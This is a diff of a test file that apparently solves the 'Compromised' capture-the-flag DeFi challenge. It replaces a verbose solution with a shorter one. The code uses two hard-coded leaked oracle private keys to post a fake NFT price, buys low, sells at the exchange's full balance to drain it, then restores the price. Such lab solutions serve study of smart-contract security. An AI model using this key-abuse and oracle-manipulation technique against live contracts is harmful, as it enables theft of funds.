@@ -53,71 +53,25 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
-        const key2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+        const PKEY1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
+        const PKEY2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        const signer1 = new ethers.Wallet(PKEY1, ethers.provider);
+        const signer2 = new ethers.Wallet(PKEY2, ethers.provider);
 
-        const oracle1 = new ethers.Wallet(key1, ethers.provider);
-        const oracle2 = new ethers.Wallet(key2, ethers.provider);
+        // Set Price - 1 WEI, and buy the NFT
+        await oracle.connect(signer1).postPrice("DVNFT", 1);
+        await oracle.connect(signer2).postPrice("DVNFT", 1);
+        await exchange.connect(player).buyOne({ value: 1 });
 
-        console.log(oracle1.address);
-        console.log(oracle2.address);
+        // Set Price - 999ETH + 1 WEI, and sell the NFT ;)
+        await oracle.connect(signer1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + BigInt(1));
+        await oracle.connect(signer2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + BigInt(1));
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
 
-        const orc1Trust = oracle.connect(oracle1);
-        const orc2Trust = oracle.connect(oracle2);
-
-
-        const setMedianPrice = async (amount) => {
-            // Before
-            let currMedianPrice = await oracle.getMedianPrice("DVNFT");
-            console.log("Current median price is", currMedianPrice.toString());
-
-            console.log("Posting to oracle 1");
-            await orc1Trust.postPrice("DVNFT", amount)
-            
-            // After 1 oracle
-            currMedianPrice = await oracle.getMedianPrice("DVNFT");
-            console.log("Current median price is", currMedianPrice.toString());
-
-            console.log("Posting to oracle 2");
-            await orc2Trust.postPrice("DVNFT", amount)
-
-            // After 2 oracle
-            currMedianPrice = await oracle.getMedianPrice("DVNFT");
-            console.log("Current median price is", currMedianPrice.toString());
-        }
-
-        // Set price to 0.01.
-        let priceToSet = ethers.utils.parseEther("0.01");
-        await setMedianPrice(priceToSet);
-
-        const attackExchange = exchange.connect(player);
-        const attackNFT = nftToken.connect(player);
-
-        // Purchase the NFT
-        await attackExchange.buyOne({
-            value: priceToSet
-        })
-
-        // Verify that we own the newly minted NFT
-        const tokenId = 0;
-        const ownerId = await attackNFT.ownerOf(tokenId);
-        expect(ownerId).to.equal(player.address);
-
-        console.log("Setting price to balance of exchange");
-        const balOfExchange = await ethers.provider.getBalance(exchange.address);
-
-        // Set the price of the NFT to the current balance of the exchange
-        priceToSet = balOfExchange
-        await setMedianPrice(priceToSet);
-
-
-        console.log("Selling NFT for the median price");
-        await attackNFT.approve(attackExchange.address, tokenId);
-        await attackExchange.sellOne(tokenId);
-
-        // Reset oracle price to intial price to meet final condition.
-        priceToSet = INITIAL_NFT_PRICE;
-        await setMedianPrice(priceToSet);
+        // Restore Original Price
+        await oracle.connect(signer1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(signer2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
     });
 
     after(async function () {
